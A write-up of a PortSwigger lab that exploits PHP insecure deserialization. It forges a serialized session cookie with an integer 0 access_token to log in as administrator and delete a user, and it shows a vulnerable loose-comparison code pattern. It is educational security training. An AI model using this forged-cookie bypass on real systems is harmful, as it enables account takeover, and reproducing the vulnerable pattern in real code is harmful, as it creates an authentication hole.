# Lab: Modifying serialized data types

 This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.

You can log in to your own account using the following credentials: wiener:peter 

**Hint**

To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.

# Notes from Portswigger:

## Modifying data types

 We've seen how you can modify attribute values in serialized objects, but it's also possible to supply unexpected data types.

PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (`==`) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to *true*.

Unusually, this also works for any alphanumeric string that starts with a number. In this case, PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == "5` of something" is in practice treated as `5 == 5`. 

This becomes even stranger when comparing a string the integer `0:`

```php
0 == "Example string" // true
```


Why? Because there is no number, that is, 0 numerals in the string. PHP treats this entire string as the integer `0`.

Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous logic flaws. 

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

 Let's say an attacker modified the password attribute so that it contained the integer `0` instead of the expected string. As long as the stored password does not start with a number, the condition would always return `true`, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.

Be aware that when modifying data types in any serialized object format, it is important to remember to update any type labels and length indicators in the serialized data too. Otherwise, the serialized object will be corrupted and will not be deserialized. 

# Step 1 Login and inspect the session mechanism

When I login, I get a session cookie that decodes to a serialized object:

![image](https://user-images.githubusercontent.com/83407557/213519933-a59862d1-e3e4-4d2e-9bca-8b95a2e96009.png)


# Step 2 breakdown the decoded cookie:

Taking a look at the decoded cookie, lets break-down what each part means

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"yl39nsun020qly1w1uy03cxalj4i0pii";}
```

`O:4:"User":2` - An object with a 4-character class name of "User" with 2 attributes

`s:8:"username"` - The first attribute's key is an 8-character long string "username"

`s:6:"wiener"` - The first attribute's value is a 6-character long string "wiener"

`s:12:"access_token"` - The second attribute's key is a 12-character long string "access_token"

`s:32:"yl39nsun020qly1w1uy03cxalj4i0pii"` - The second attribute's value is a 32-character string "yl39nsun020qly1w1uy03cxalj4i0pii"

# Step 3 Change the data-type of second attribute's value

From the notes, I see that if the PHP code is comparing strings to see if I have a valid access_token, if I change the value of my access_token to the integer `0` it could be compared to a string that has no integers; therefore the result should be true. To do this I want to change:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"yl39nsun020qly1w1uy03cxalj4i0pii";}
```
to this ( the string becomes a single character long integer (0))

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```

I then also need to change my username to administrator:

```bash
└─$ python -c 'print(len("administrator"))'     
13                    
```


```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
I also want to change the name of the request parameter "id"

![image](https://user-images.githubusercontent.com/83407557/213525933-97cfb498-8c92-4948-a1c0-26fa49498641.png)

Doing so gets me into the admin pannel:

![image](https://user-images.githubusercontent.com/83407557/213526022-e12f7f44-7ac4-47a5-905c-fd9319fbfd76.png)

I do this again on the admin panel:

![image](https://user-images.githubusercontent.com/83407557/213526505-5a816a97-ea91-4d95-8da3-8c9a15808654.png)

And then again to delete carlos:

![image](https://user-images.githubusercontent.com/83407557/213526762-46e0ab37-d4de-49a8-92d6-2cdf283db458.png)

And in doing so the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/213526846-66588249-cc7b-423d-ad76-45ecbfa6c826.png)
